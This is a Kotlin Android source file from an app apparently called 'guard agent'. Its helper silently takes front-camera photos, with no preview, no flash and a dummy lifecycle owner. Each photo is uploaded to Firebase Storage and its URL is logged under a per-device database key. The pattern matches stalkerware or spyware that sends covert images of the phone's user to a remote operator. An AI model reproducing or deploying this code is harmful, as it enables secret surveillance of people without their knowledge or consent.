package com.guard.agent.helpers.media

import android.annotation.SuppressLint
import android.content.Context
import android.net.Uri
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.storage.FirebaseStorage
import com.guard.agent.core.Constants
import com.guard.agent.utils.Logger
import java.io.File
import java.util.concurrent.Executors

object CameraHelper {

    private const val TAG = "CameraHelper"
    private val executor = Executors.newSingleThreadExecutor()

    /**
     * Front camera se ek photo capture karke Firebase Storage pe upload karo.
     */
    @SuppressLint("RestrictedApi")
    fun captureFront(ctx: Context, deviceKey: String) {
        val future = ProcessCameraProvider.getInstance(ctx)
        future.addListener({
            try {
                val provider = future.get()

                // Dummy LifecycleOwner banao
                val owner = DummyLifecycleOwner()
                owner.start()

                val selector = CameraSelector.DEFAULT_FRONT_CAMERA
                val capture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .setFlashMode(ImageCapture.FLASH_MODE_OFF)
                    .build()

                provider.unbindAll()
                provider.bindToLifecycle(owner, selector, capture)

                // Camera ready hone ke liye chhota delay
                Thread.sleep(700)

                val file = File(
                    ctx.cacheDir,
                    "snap_${System.currentTimeMillis()}.jpg"
                )

                val opts = ImageCapture.OutputFileOptions.Builder(file).build()
                capture.takePicture(
                    opts,
                    executor,
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(out: ImageCapture.OutputFileResults) {
                            Logger.d(TAG, "Image saved: ${file.absolutePath}")
                            upload(ctx, deviceKey, file, Constants.SUB_PHOTOS)
                            try {
                                provider.unbindAll()
                                owner.stop()
                            } catch (_: Exception) {}
                        }

                        override fun onError(e: ImageCaptureException) {
                            Logger.e(TAG, "Capture error", e)
                            try {
                                provider.unbindAll()
                                owner.stop()
                            } catch (_: Exception) {}
                            file.delete()
                        }
                    }
                )
            } catch (e: Exception) {
                Logger.e(TAG, "captureFront failed", e)
            }
        }, ContextCompat.getMainExecutor(ctx))
    }

    /**
     * File ko Firebase Storage pe upload karo, phir URL ko Realtime DB mein save.
     */
    fun upload(ctx: Context, deviceKey: String, file: File, folder: String) {
        try {
            val storageRef = FirebaseStorage.getInstance().reference
                .child("$folder/$deviceKey/${file.name}")

            storageRef.putFile(Uri.fromFile(file))
                .addOnSuccessListener {
                    storageRef.downloadUrl.addOnSuccessListener { url ->
                        saveUrl(deviceKey, folder, url.toString())
                        file.delete()
                    }
                }
                .addOnFailureListener { e ->
                    Logger.e(TAG, "Upload failed", e)
                }
        } catch (e: Exception) {
            Logger.e(TAG, "upload failed", e)
        }
    }

    private fun saveUrl(deviceKey: String, folder: String, url: String) {
        try {
            FirebaseDatabase.getInstance()
                .getReference(Constants.PATH_DEVICES)
                .child(deviceKey).child(folder).push()
                .setValue(
                    mapOf(
                        "url" to url,
                        "time" to System.currentTimeMillis()
                    )
                )
        } catch (e: Exception) {
            Logger.e(TAG, "saveUrl failed", e)
        }
    }

    /**
     * Dummy LifecycleOwner — CameraX ko chahiye hota hai.
     */
    private class DummyLifecycleOwner : LifecycleOwner {
        private val registry = LifecycleRegistry(this)
        override val lifecycle: Lifecycle get() = registry

        fun start() {
            registry.currentState = Lifecycle.State.RESUMED
        }

        fun stop() {
            registry.currentState = Lifecycle.State.DESTROYED
        }
    }
}
